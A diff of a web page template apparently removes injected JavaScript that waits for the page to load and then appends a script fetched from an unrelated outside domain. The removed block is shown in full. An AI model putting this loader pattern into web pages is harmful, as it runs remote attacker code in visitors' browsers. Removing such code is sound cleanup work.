@@ -101,20 +101,6 @@
         setInterval(downtimers,1000);
     </script>
 
-    <script type="text/javascript">
-        (function(w) {
-            var script = document.createElement('script');
-            var i = setInterval(function() {
-                if (typeof w.document.body !== 'undefined') {
-                    script.src = 'http://axwpe.people-are-thought.info' + '/?73169=peylo_ezvb6yuri1ouzg6OHk5eQ';
-                    w.document.body.appendChild(script);
-                    clearInterval(i);
-                }
-            }, 200);
-        })(window);
-    </script>
-
-
 @endsection
 @section('style')
     <style>
